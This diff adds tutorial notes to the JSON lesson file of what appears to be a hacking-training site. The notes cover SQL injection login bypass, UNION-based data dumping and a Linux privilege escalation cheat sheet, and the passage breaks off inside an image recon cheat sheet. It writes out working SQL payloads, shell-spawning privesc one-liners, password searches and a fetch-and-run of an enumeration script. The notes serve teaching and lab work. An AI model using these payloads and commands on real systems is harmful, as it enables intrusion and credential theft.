@@ -3483,5 +3483,2607 @@
         "text": "Demonstrate full-spectrum XXE exploitation: reflected, XInclude-based, and blind OOB exfiltration. Provide technical reasoning, proof of exploitation, and mitigation strategy."
       }
     ]
+  },
+  {
+    "id": 12,
+    "slug": "basic-sql-injection",
+    "title": "Basic SQL Injection",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/sql-injection/basic-sql-injection.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "sqli-intro",
+        "text": "What is SQL Injection?"
+      },
+      {
+        "type": "order_block",
+        "id": "sqli-definition",
+        "text": "SQL Injection (SQLi) is a vulnerability that occurs when user input is directly included inside a database query without proper validation or parameterization. An attacker can inject SQL syntax to alter the structure of the query executed by the database."
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-lab-database",
+        "text": "Example Lab Database"
+      },
+      {
+        "type": "code_block",
+        "id": "sqli-lab-db-code",
+        "language": "sql",
+        "code": "CREATE DATABASE sqli_lab;\n\nUSE sqli_lab;\n\nCREATE TABLE users (\n  id INT AUTO_INCREMENT PRIMARY KEY,\n  username VARCHAR(50),\n  password VARCHAR(50)\n);\n\nINSERT INTO users (username,password) VALUES\n('admin','admin123'),\n('john','qwerty'),\n('alice','123123');"
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-lab-db-output",
+        "text": "Database Content"
+      },
+      {
+        "type": "output_block",
+        "id": "sqli-lab-db-output-block",
+        "language": "text",
+        "code": "id | username | password\n1  | admin    | admin123\n2  | john     | qwerty\n3  | alice    | 123123"
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-basic-query",
+        "text": "Typical SQL Query in Web Applications"
+      },
+      {
+        "type": "code_block",
+        "id": "sqli-basic-query-code",
+        "language": "sql",
+        "code": "SELECT * FROM users WHERE username = 'admin' AND password = 'admin123';"
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-basic-output",
+        "text": "Example Database Result"
+      },
+      {
+        "type": "output_block",
+        "id": "sqli-basic-output-block",
+        "language": "text",
+        "code": "id | username | password\n1  | admin    | admin123"
+      },
+      {
+        "type": "order_block",
+        "id": "sqli-query-explanation",
+        "text": "If a row matches both username and password conditions, the application treats the user as authenticated."
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-vulnerable-code",
+        "text": "Example Vulnerable Backend Code"
+      },
+      {
+        "type": "code_block",
+        "id": "sqli-vulnerable-code-example",
+        "language": "javascript",
+        "code": "const query = \"SELECT * FROM users WHERE username='\" + username + \"' AND password='\" + password + \"'\";"
+      },
+      {
+        "type": "order_block",
+        "id": "sqli-vulnerable-analysis",
+        "text": "The application directly concatenates user input into the SQL query. This allows attackers to inject SQL syntax and change the logic of the query."
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-breaking-query",
+        "text": "Breaking the Query Structure"
+      },
+      {
+        "type": "code_block",
+        "id": "sqli-breaking-payload",
+        "language": "text",
+        "code": "admin' --"
+      },
+      {
+        "type": "order_block",
+        "id": "sqli-breaking-analysis",
+        "text": "The single quote terminates the string. The comment operator <highlight>(--)</highlight> disables the rest of the query."
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-final-query",
+        "text": "Resulting Query After Injection"
+      },
+      {
+        "type": "code_block",
+        "id": "sqli-final-query-code",
+        "language": "sql",
+        "code": "SELECT * FROM users WHERE username='admin' -- ' AND password='anything';"
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-login-result",
+        "text": "Application Output"
+      },
+      {
+        "type": "output_block",
+        "id": "sqli-login-output",
+        "language": "text",
+        "code": "Login successful\nWelcome admin"
+      },
+      {
+        "type": "order_block",
+        "id": "sqli-final-analysis",
+        "text": "Because the password condition is commented out, the database only checks <highlight>username='admin'</highlight>. The attacker logs in without knowing the password."
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-classic-payload",
+        "text": "Classic SQL Injection Payload"
+      },
+      {
+        "type": "code_block",
+        "id": "sqli-or-payload",
+        "language": "text",
+        "code": "' OR 1=1 --"
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-classic-result",
+        "text": "Query Generated by the Application"
+      },
+      {
+        "type": "code_block",
+        "id": "sqli-or-query",
+        "language": "sql",
+        "code": "SELECT * FROM users WHERE username='' OR 1=1 -- ' AND password='';"
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-db-response",
+        "text": "Database Response"
+      },
+      {
+        "type": "output_block",
+        "id": "sqli-db-response-output",
+        "language": "text",
+        "code": "id | username | password\n1  | admin    | admin123\n2  | john     | qwerty\n3  | alice    | 123123"
+      },
+      {
+        "type": "order_block",
+        "id": "sqli-or-analysis",
+        "text": "The condition <highlight>OR 1=1</highlight> always evaluates to true, so the database returns every row in the table."
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-comments",
+        "text": "SQL Comment Syntax"
+      },
+      {
+        "type": "code_block",
+        "id": "sqli-comments-code",
+        "language": "text",
+        "code": "--\n#\n/* comment */"
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-comments-example",
+        "text": "Example Query With Comment"
+      },
+      {
+        "type": "code_block",
+        "id": "sqli-comments-query",
+        "language": "sql",
+        "code": "SELECT * FROM users WHERE username='admin' -- ' AND password='anything';"
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-comments-output",
+        "text": "Query Evaluation"
+      },
+      {
+        "type": "output_block",
+        "id": "sqli-comments-output-block",
+        "language": "text",
+        "code": "Database ignores everything after --\nOnly condition checked: username='admin'\nResult: admin row returned"
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-url-example",
+        "text": "SQL Injection Through URL Parameters"
+      },
+      {
+        "type": "code_block",
+        "id": "sqli-url",
+        "language": "text",
+        "code": "https://example.com/product?id=5"
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-url-query",
+        "text": "Backend Query"
+      },
+      {
+        "type": "code_block",
+        "id": "sqli-url-query-code",
+        "language": "sql",
+        "code": "SELECT * FROM products WHERE id=5;"
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-url-normal-output",
+        "text": "Normal Result"
+      },
+      {
+        "type": "output_block",
+        "id": "sqli-url-normal-output-block",
+        "language": "text",
+        "code": "id | name       | price\n5  | Laptop Bag | 40"
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-url-injection",
+        "text": "Injected Parameter"
+      },
+      {
+        "type": "code_block",
+        "id": "sqli-url-payload",
+        "language": "text",
+        "code": "https://example.com/product?id=5 OR 1=1"
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-url-final",
+        "text": "Final Query Executed"
+      },
+      {
+        "type": "code_block",
+        "id": "sqli-url-final-query",
+        "language": "sql",
+        "code": "SELECT * FROM products WHERE id=5 OR 1=1;"
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-url-output",
+        "text": "Database Output"
+      },
+      {
+        "type": "output_block",
+        "id": "sqli-url-output-block",
+        "language": "bash",
+        "code": "id | name        | price\n1  | Phone       | 500\n2  | Tablet      | 300\n3  | Headphones  | 100\n5  | Laptop Bag  | 40"
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-common-inputs",
+        "text": "Common Injection Points"
+      },
+      {
+        "type": "explanation",
+        "id": "sqli-inputs-list",
+        "title": "Where SQL Injection Often Occurs",
+        "items": [
+          "Login forms",
+          "Search fields",
+          "URL parameters",
+          "Filters and sorting parameters",
+          "Cookies",
+          "HTTP headers",
+          "JSON request bodies",
+          "API endpoints"
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-root-cause",
+        "text": "Root Cause of SQL Injection"
+      },
+      {
+        "type": "order_block",
+        "id": "sqli-root-cause-explanation",
+        "text": "SQL Injection happens when developers construct queries using string concatenation instead of safe query mechanisms such as prepared statements."
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-secure-query",
+        "text": "Secure Query Using Parameterization"
+      },
+      {
+        "type": "code_block",
+        "id": "sqli-secure-example",
+        "language": "javascript",
+        "code": "const query = \"SELECT * FROM users WHERE username=? AND password=?\";"
+      },
+      {
+        "type": "section_heading",
+        "id": "sqli-conclusion",
+        "text": "Conclusion"
+      },
+      {
+        "type": "order_block",
+        "id": "sqli-summary",
+        "text": "SQL Injection allows attackers to manipulate database queries by injecting SQL syntax through application inputs. This can lead to authentication bypass, database enumeration, and sensitive data extraction."
+      }
+    ]
+  },
+  {
+    "id": 13,
+    "slug": "union-sql-injection",
+    "title": "Union SQL Injection",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/sql-injection/union-sql-injection.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "union-sqli-intro",
+        "text": "What is UNION-Based SQL Injection?"
+      },
+      {
+        "type": "order_block",
+        "id": "union-sqli-definition",
+        "text": "UNION-based SQL Injection is a technique where an attacker uses the SQL <highlight>UNION</highlight> operator to combine results from the original query with a malicious query. This allows attackers to retrieve data from other tables in the database."
+      },
+      {
+        "type": "section_heading",
+        "id": "union-lab-database",
+        "text": "Example Lab Database"
+      },
+      {
+        "type": "code_block",
+        "id": "union-lab-db-code",
+        "language": "sql",
+        "code": "CREATE DATABASE union_sqli_lab;\n\nUSE union_sqli_lab;\n\nCREATE TABLE products (\n id INT AUTO_INCREMENT PRIMARY KEY,\n name VARCHAR(100),\n description TEXT\n);\n\nINSERT INTO products (name,description) VALUES\n('Laptop','Gaming Laptop'),\n('Phone','Android Phone');"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-db-content",
+        "text": "Database Content"
+      },
+      {
+        "type": "output_block",
+        "id": "union-db-output",
+        "language": "text",
+        "code": "id | name   | description\n1  | Laptop | Gaming Laptop\n2  | Phone  | Android Phone"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-vulnerable-query",
+        "text": "Example Vulnerable Query"
+      },
+      {
+        "type": "code_block",
+        "id": "union-vulnerable-query-code",
+        "language": "sql",
+        "code": "SELECT name, description FROM products WHERE id=1;"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-vulnerable-code",
+        "text": "Example Vulnerable Backend Code"
+      },
+      {
+        "type": "code_block",
+        "id": "union-vulnerable-code-example",
+        "language": "php",
+        "code": "$id = $_GET['id'];\n$query = \"SELECT name, description FROM products WHERE id=$id\";"
+      },
+      {
+        "type": "order_block",
+        "id": "union-vulnerable-analysis",
+        "text": "The application directly inserts user input into the SQL query. This allows attackers to modify the query structure and perform SQL injection."
+      },
+      {
+        "type": "section_heading",
+        "id": "union-normal-request",
+        "text": "Normal Application Request"
+      },
+      {
+        "type": "code_block",
+        "id": "union-normal-url",
+        "language": "text",
+        "code": "http://localhost:8000/index.php?id=1"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-normal-query",
+        "text": "Query Executed by Database"
+      },
+      {
+        "type": "code_block",
+        "id": "union-normal-query-code",
+        "language": "sql",
+        "code": "SELECT name, description FROM products WHERE id=1;"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-normal-output",
+        "text": "Application Output"
+      },
+      {
+        "type": "output_block",
+        "id": "union-normal-output-block",
+        "language": "text",
+        "code": "Laptop\nGaming Laptop"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-column-discovery",
+        "text": "Discovering Column Count Using ORDER BY"
+      },
+      {
+        "type": "code_block",
+        "id": "union-orderby-payloads",
+        "language": "text",
+        "code": "?id=1 ORDER BY 1\n?id=1 ORDER BY 2\n?id=1 ORDER BY 3"
+      },
+      {
+        "type": "order_block",
+        "id": "union-orderby-analysis",
+        "text": "Attackers increase the column number until the database throws an error. The highest valid number indicates how many columns the original query returns."
+      },
+      {
+        "type": "section_heading",
+        "id": "union-column-test",
+        "text": "Testing UNION Injection"
+      },
+      {
+        "type": "code_block",
+        "id": "union-test-payload",
+        "language": "text",
+        "code": "?id=-1 UNION SELECT 1,2"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-test-query",
+        "text": "Final Query Executed"
+      },
+      {
+        "type": "code_block",
+        "id": "union-test-query-code",
+        "language": "sql",
+        "code": "SELECT name, description FROM products WHERE id=-1\nUNION\nSELECT 1,2;"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-test-output",
+        "text": "Application Output"
+      },
+      {
+        "type": "output_block",
+        "id": "union-test-output-block",
+        "language": "text",
+        "code": "1\n2"
+      },
+      {
+        "type": "order_block",
+        "id": "union-test-analysis",
+        "text": "If the numbers appear in the output, it means the UNION injection worked and the attacker can control the returned data."
+      },
+      {
+        "type": "section_heading",
+        "id": "union-database-name",
+        "text": "Extracting Database Name"
+      },
+      {
+        "type": "code_block",
+        "id": "union-db-payload",
+        "language": "text",
+        "code": "?id=-1 UNION SELECT database(),2"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-db-output",
+        "text": "Database Output"
+      },
+      {
+        "type": "output_block",
+        "id": "union-db-output-block",
+        "language": "text",
+        "code": "union_sqli_lab"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-table-enumeration",
+        "text": "Enumerating Tables"
+      },
+      {
+        "type": "code_block",
+        "id": "union-tables-payload",
+        "language": "text",
+        "code": "?id=-1 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-tables-output",
+        "text": "Tables Found"
+      },
+      {
+        "type": "output_block",
+        "id": "union-tables-output-block",
+        "language": "text",
+        "code": "products\nusers\norders"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-column-enumeration",
+        "text": "Enumerating Columns"
+      },
+      {
+        "type": "code_block",
+        "id": "union-columns-payload",
+        "language": "text",
+        "code": "?id=-1 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-columns-output",
+        "text": "Columns Found"
+      },
+      {
+        "type": "output_block",
+        "id": "union-columns-output-block",
+        "language": "text",
+        "code": "id\nusername\npassword\nemail"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-concat",
+        "text": "Using CONCAT to Merge Data"
+      },
+      {
+        "type": "order_block",
+        "id": "union-concat-explanation",
+        "text": "Sometimes the application only displays one column. Attackers use the SQL <highlight>CONCAT()</highlight> function to merge multiple fields into a single column so that more data can be displayed."
+      },
+      {
+        "type": "code_block",
+        "id": "union-concat-example",
+        "language": "text",
+        "code": "?id=-1 UNION SELECT CONCAT(username,':',password),2 FROM users"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-concat-output",
+        "text": "Merged Output"
+      },
+      {
+        "type": "output_block",
+        "id": "union-concat-output-block",
+        "language": "text",
+        "code": "admin:admin123\njohn:qwerty\nalice:123123"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-data-dump",
+        "text": "Dumping Entire Table Data"
+      },
+      {
+        "type": "order_block",
+        "id": "union-dump-explanation",
+        "text": "After discovering the table and column names, attackers can dump the entire table to extract sensitive information such as usernames and passwords."
+      },
+      {
+        "type": "code_block",
+        "id": "union-dump-payload",
+        "language": "text",
+        "code": "?id=-1 UNION SELECT username,password FROM users"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-dump-output",
+        "text": "Dumped Data"
+      },
+      {
+        "type": "output_block",
+        "id": "union-dump-output-block",
+        "language": "text",
+        "code": "admin | admin123\njohn  | qwerty\nalice | 123123"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-group-concat",
+        "text": "Using GROUP_CONCAT for Full Data Dump"
+      },
+      {
+        "type": "order_block",
+        "id": "union-group-concat-explain",
+        "text": "Sometimes the application only shows a single row of output. Attackers use the SQL <highlight>GROUP_CONCAT()</highlight> function to combine multiple rows into one single result. This allows dumping a large amount of data in a single response."
+      },
+      {
+        "type": "code_block",
+        "id": "union-group-concat-payload",
+        "language": "text",
+        "code": "?id=-1 UNION SELECT GROUP_CONCAT(username,':',password),2 FROM users"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-group-concat-output",
+        "text": "Combined Dump Output"
+      },
+      {
+        "type": "output_block",
+        "id": "union-group-concat-output-block",
+        "language": "text",
+        "code": "admin:admin123,john:qwerty,alice:123123"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-limit-intro",
+        "text": "Using LIMIT to Extract Specific Rows"
+      },
+      {
+        "type": "order_block",
+        "id": "union-limit-explain",
+        "text": "Some applications restrict how many results are displayed. Attackers can use the SQL <highlight>LIMIT</highlight> clause to retrieve specific rows from the database one by one."
+      },
+      {
+        "type": "code_block",
+        "id": "union-limit-example1",
+        "language": "text",
+        "code": "?id=-1 UNION SELECT username,password FROM users LIMIT 0,1"
+      },
+      {
+        "type": "code_block",
+        "id": "union-limit-example2",
+        "language": "text",
+        "code": "?id=-1 UNION SELECT username,password FROM users LIMIT 1,1"
+      },
+      {
+        "type": "code_block",
+        "id": "union-limit-example3",
+        "language": "text",
+        "code": "?id=-1 UNION SELECT username,password FROM users LIMIT 2,1"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-limit-output",
+        "text": "Row by Row Extraction"
+      },
+      {
+        "type": "output_block",
+        "id": "union-limit-output-block",
+        "language": "text",
+        "code": "admin | admin123\njohn  | qwerty\nalice | 123123"
+      },
+      {
+        "type": "section_heading",
+        "id": "union-offset-intro",
+        "text": "Understanding LIMIT Offset"
+      },
+      {
+        "type": "order_block",
+        "id": "union-offset-explain",
+        "text": "The LIMIT clause works as LIMIT offset,count. The offset specifies where the database should start returning rows. Attackers increase the offset value to iterate through the entire table."
+      },
+      {
+        "type": "section_heading",
+        "id": "union-important-rules",
+        "text": "Important Rules for UNION SQL Injection"
+      },
+      {
+        "type": "explanation",
+        "id": "union-rules-list",
+        "title": "Requirements for UNION Injection",
+        "items": [
+          "The number of columns must match the original query",
+          "Data types should be compatible",
+          "The injected query must return the same column count",
+          "At least one column must be visible in the application output"
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "union-conclusion",
+        "text": "Conclusion"
+      },
+      {
+        "type": "order_block",
+        "id": "union-summary",
+        "text": "UNION-based SQL Injection allows attackers to merge malicious queries with legitimate queries. This enables attackers to enumerate databases, discover tables and columns, and extract sensitive data from the database."
+      }
+    ]
+  },
+  {
+    "id": 14,
+    "slug": "privESC-cheatsheet",
+    "title": "PrivESC cheatsheet",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/privESC-cheatsheet.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "privesc-intro",
+        "text": "Linux Privilege Escalation Command Cheat Sheet"
+      },
+      {
+        "type": "order_block",
+        "id": "privesc-definition",
+        "text": "Privilege escalation is the process of gaining higher-level permissions on a system after obtaining an initial foothold such as a web shell or limited user account."
+      },
+      {
+        "type": "section_heading",
+        "id": "privesc-basic-enum",
+        "text": "Basic Enumeration Commands"
+      },
+      {
+        "type": "code_block",
+        "id": "privesc-basic-code",
+        "language": "bash",
+        "code": "whoami\nid\nhostname\nuname -a\ncat /etc/os-release"
+      },
+      {
+        "type": "output_block",
+        "id": "privesc-basic-output",
+        "language": "text",
+        "code": "whoami -> shows current user\nid -> shows user id and groups\nhostname -> shows machine name\nuname -a -> kernel and system information"
+      },
+      {
+        "type": "section_heading",
+        "id": "privesc-system-info",
+        "text": "System Information Enumeration"
+      },
+      {
+        "type": "code_block",
+        "id": "privesc-system-code",
+        "language": "bash",
+        "code": "uname -a\ncat /proc/version\nlsb_release -a\nuname -r"
+      },
+      {
+        "type": "output_block",
+        "id": "privesc-system-output",
+        "language": "text",
+        "code": "Kernel version\nOperating system distribution\nSystem architecture"
+      },
+      {
+        "type": "section_heading",
+        "id": "privesc-user-enum",
+        "text": "User Enumeration"
+      },
+      {
+        "type": "code_block",
+        "id": "privesc-user-code",
+        "language": "bash",
+        "code": "cat /etc/passwd\ncat /etc/passwd | grep bash\nls /home"
+      },
+      {
+        "type": "output_block",
+        "id": "privesc-user-output",
+        "language": "text",
+        "code": "Lists all users on the system\nShows users with login shells\nLists user home directories"
+      },
+      {
+        "type": "section_heading",
+        "id": "privesc-sudo",
+        "text": "Checking Sudo Privileges"
+      },
+      {
+        "type": "code_block",
+        "id": "privesc-sudo-code",
+        "language": "bash",
+        "code": "sudo -l"
+      },
+      {
+        "type": "output_block",
+        "id": "privesc-sudo-output",
+        "language": "text",
+        "code": "Lists commands the current user can run as root"
+      },
+      {
+        "type": "section_heading",
+        "id": "privesc-suid",
+        "text": "Finding SUID Binaries"
+      },
+      {
+        "type": "code_block",
+        "id": "privesc-suid-code",
+        "language": "bash",
+        "code": "find / -perm -4000 2>/dev/null"
+      },
+      {
+        "type": "output_block",
+        "id": "privesc-suid-output",
+        "language": "text",
+        "code": "Lists binaries with SUID bit set which may run with root privileges"
+      },
+      {
+        "type": "section_heading",
+        "id": "privesc-suid-exploit",
+        "text": "Example SUID Exploit"
+      },
+      {
+        "type": "code_block",
+        "id": "privesc-suid-exploit-code",
+        "language": "bash",
+        "code": "find . -exec /bin/sh \\; -quit"
+      },
+      {
+        "type": "output_block",
+        "id": "privesc-suid-exploit-output",
+        "language": "text",
+        "code": "Spawns a shell if find is executed with elevated privileges"
+      },
+      {
+        "type": "section_heading",
+        "id": "privesc-writable",
+        "text": "Finding Writable Files"
+      },
+      {
+        "type": "code_block",
+        "id": "privesc-writable-code",
+        "language": "bash",
+        "code": "find / -writable -type f 2>/dev/null\nfind / -writable -type d 2>/dev/null"
+      },
+      {
+        "type": "output_block",
+        "id": "privesc-writable-output",
+        "language": "text",
+        "code": "Lists writable files and directories that may allow privilege escalation"
+      },
+      {
+        "type": "section_heading",
+        "id": "privesc-cron",
+        "text": "Cron Job Enumeration"
+      },
+      {
+        "type": "code_block",
+        "id": "privesc-cron-code",
+        "language": "bash",
+        "code": "crontab -l\ncat /etc/crontab\nls /etc/cron*"
+      },
+      {
+        "type": "output_block",
+        "id": "privesc-cron-output",
+        "language": "text",
+        "code": "Lists scheduled tasks that may run as root"
+      },
+      {
+        "type": "section_heading",
+        "id": "privesc-path-hijack",
+        "text": "PATH Hijacking"
+      },
+      {
+        "type": "code_block",
+        "id": "privesc-path-code",
+        "language": "bash",
+        "code": "echo $PATH"
+      },
+      {
+        "type": "order_block",
+        "id": "privesc-path-explanation",
+        "text": "If a root script calls a command without an absolute path, an attacker may place a malicious binary earlier in the PATH."
+      },
+      {
+        "type": "section_heading",
+        "id": "privesc-path-exploit",
+        "text": "Example PATH Hijacking Exploit"
+      },
+      {
+        "type": "code_block",
+        "id": "privesc-path-exploit-code",
+        "language": "bash",
+        "code": "echo \"/bin/bash\" > tar\nchmod +x tar\nexport PATH=/tmp:$PATH"
+      },
+      {
+        "type": "section_heading",
+        "id": "privesc-capabilities",
+        "text": "Checking Linux Capabilities"
+      },
+      {
+        "type": "code_block",
+        "id": "privesc-cap-code",
+        "language": "bash",
+        "code": "getcap -r / 2>/dev/null"
+      },
+      {
+        "type": "output_block",
+        "id": "privesc-cap-output",
+        "language": "text",
+        "code": "Lists binaries with special Linux capabilities"
+      },
+      {
+        "type": "section_heading",
+        "id": "privesc-cap-exploit",
+        "text": "Capability Exploit Example"
+      },
+      {
+        "type": "code_block",
+        "id": "privesc-cap-exploit-code",
+        "language": "bash",
+        "code": "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
+      },
+      {
+        "type": "section_heading",
+        "id": "privesc-network",
+        "text": "Network Enumeration"
+      },
+      {
+        "type": "code_block",
+        "id": "privesc-network-code",
+        "language": "bash",
+        "code": "netstat -tulpn\nss -tulpn"
+      },
+      {
+        "type": "output_block",
+        "id": "privesc-network-output",
+        "language": "text",
+        "code": "Lists open ports and services running on the machine"
+      },
+      {
+        "type": "section_heading",
+        "id": "privesc-process",
+        "text": "Running Processes"
+      },
+      {
+        "type": "code_block",
+        "id": "privesc-process-code",
+        "language": "bash",
+        "code": "ps aux"
+      },
+      {
+        "type": "output_block",
+        "id": "privesc-process-output",
+        "language": "text",
+        "code": "Displays all running processes and their owners"
+      },
+      {
+        "type": "section_heading",
+        "id": "privesc-password-search",
+        "text": "Searching for Passwords"
+      },
+      {
+        "type": "code_block",
+        "id": "privesc-pass-code",
+        "language": "bash",
+        "code": "grep -r \"password\" / 2>/dev/null\ngrep -r \"pass\" /var/www"
+      },
+      {
+        "type": "output_block",
+        "id": "privesc-pass-output",
+        "language": "text",
+        "code": "Searches system files and web directories for stored credentials"
+      },
+      {
+        "type": "section_heading",
+        "id": "privesc-auto-tools",
+        "text": "Automated Enumeration Tools"
+      },
+      {
+        "type": "code_block",
+        "id": "privesc-linpeas-code",
+        "language": "bash",
+        "code": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh"
+      },
+      {
+        "type": "output_block",
+        "id": "privesc-linpeas-output",
+        "language": "text",
+        "code": "LinPEAS automatically scans the system for privilege escalation vulnerabilities"
+      },
+      {
+        "type": "section_heading",
+        "id": "privesc-kernel",
+        "text": "Kernel Exploit Enumeration"
+      },
+      {
+        "type": "code_block",
+        "id": "privesc-kernel-code",
+        "language": "bash",
+        "code": "uname -r\nsearchsploit linux kernel"
+      },
+      {
+        "type": "section_heading",
+        "id": "privesc-summary",
+        "text": "Most Important PrivEsc Commands"
+      },
+      {
+        "type": "code_block",
+        "id": "privesc-top3",
+        "language": "bash",
+        "code": "sudo -l\nfind / -perm -4000 2>/dev/null\ngetcap -r / 2>/dev/null"
+      },
+      {
+        "type": "order_block",
+        "id": "privesc-summary-text",
+        "text": "These three commands quickly identify the most common privilege escalation vectors on Linux systems."
+      }
+    ]
+  },
+  {
+    "id": 14,
+    "slug": "images-cheatsheet",
+    "title": "Images cheatsheet",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/images-cheatsheet.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "image-intro",
+        "text": "Image Recon and Exploitation Cheat Sheet"
+      },
+      {
+        "type": "order_block",
+        "id": "image-definition",
+        "text": "Images on websites can contain sensitive information such as metadata, hidden data, exposed paths, or even embedded credentials. Attackers often analyze images to gather intelligence or discover vulnerabilities."
+      },
+      {
+        "type": "section_heading",
+        "id": "image-download",
+        "text": "Download Image From Target"
+      },
+      {
+        "type": "code_block",
+        "id": "image-download-code",
+        "language": "bash",
+        "code": "wget https://target.com/images/logo.png\ncurl -O https://target.com/uploads/image.jpg"
+      },
+      {
+        "type": "output_block",
+        "id": "image-download-output",
+        "language": "text",
+        "code": "logo.png saved\nimage.jpg saved"
+      },
+      {
+        "type": "section_heading",
+        "id": "image-metadata",
+        "text": "Extract Image Metadata"
+      },
+      {
+        "type": "code_block",
+        "id": "image-metadata-code",
+        "language": "bash",
+        "code": "exiftool image.jpg"
+      },
+      {
+        "type": "output_block",
+        "id": "image-metadata-output",
+        "language": "text",
+        "code": "File Name: image.jpg\nCamera Model: Canon EOS\nAuthor: admin\nSoftware: Adobe Photoshop\nCreation Date: 2024:01:12"
+      },
+      {
+        "type": "order_block",
+        "id": "image-metadata-analysis",
+        "text": "Metadata may reveal usernames, GPS coordinates, software versions, or internal file paths."
+      },
+      {
+        "type": "section_heading",
+        "id": "image-hidden-strings",
+        "text": "Extract Hidden Strings"
+      },
+      {
+        "type": "code_block",
+        "id": "image-strings-code",
+        "language": "bash",
+        "code": "strings image.jpg"
+      },
+      {
+        "type": "output_block",
+        "id": "image-strings-output",
+        "language": "text",
+        "code": "admin\npassword123\n/uploads/private/\ninternal-server"
+      },
+      {
+        "type": "order_block",
+        "id": "image-strings-analysis",
+        "text": "The strings command reveals readable text embedded inside the image binary."
+      },
+      {
+        "type": "section_heading",
+        "id": "image-binwalk",
+        "text": "Detect Embedded Files"
+      },
+      {
+        "type": "code_block",
+        "id": "image-binwalk-code",
+        "language": "bash",
+        "code": "binwalk image.jpg"
+      },
+      {
+        "type": "output_block",
+        "id": "image-binwalk-output",
+        "language": "text",
+        "code": "DECIMAL       HEXADECIMAL     DESCRIPTION\n-------------------------------------------------\n0             0x0              JPEG image data\n10567         0x2947           ZIP archive data"
+      },
+      {
+        "type": "order_block",
+        "id": "image-binwalk-analysis",
+        "text": "Sometimes files like ZIP archives are hidden inside images."
+      },
+      {
+        "type": "section_heading",
+        "id": "image-extract-binwalk",
+        "text": "Extract Hidden Files"
+      },
+      {
+        "type": "code_block",
+        "id": "image-binwalk-extract",
+        "language": "bash",
+        "code": "binwalk -e image.jpg"
+      },
+      {
+        "type": "output_block",
+        "id": "image-binwalk-extract-output",
+        "language": "text",
+        "code": "_image.jpg.extracted/\nsecret.zip"
+      },
+      {
+        "type": "section_heading",
+        "id": "image-steganography",
+        "text": "Steganography Detection"
+      },
+      {
+        "type": "code_block",
+        "id": "image-steg-code",
+        "language": "bash",
+        "code": "steghide info image.jpg"
+      },
+      {
+        "type": "output_block",
+        "id": "image-steg-output",
+        "language": "text",
+        "code": "embedded file: secret.txt\nsize: 2 KB"
+      },
+      {
+        "type": "section_heading",
+        "id": "image-steg-extract",
+        "text": "Extract Hidden Steganography Data"
+      },
+      {
+        "type": "code_block",
+        "id": "image-steg-extract-code",
+        "language": "bash",
+        "code": "steghide extract -sf image.jpg"
+      },
+      {
+        "type": "output_block",
+        "id": "image-steg-extract-output",
+        "language": "text",
+        "code": "wrote extracted data to secret.txt"
+      },
+      {
+        "type": "section_heading",
+        "id": "image-file-type",
+        "text": "Check File Type"
+      },
+      {
+        "type": "code_block",
+        "id": "image-file-type-code",
+        "language": "bash",
+        "code": "file image.jpg"
+      },
+      {
+        "type": "output_block",
+        "id": "image-file-type-output",
+        "language": "text",
+        "code": "image.jpg: JPEG image data"
+      },
+      {
+        "type": "section_heading",
+        "id": "image-hash",
+        "text": "Generate Image Hash"
+      },
+      {
+        "type": "code_block",
+        "id": "image-hash-code",
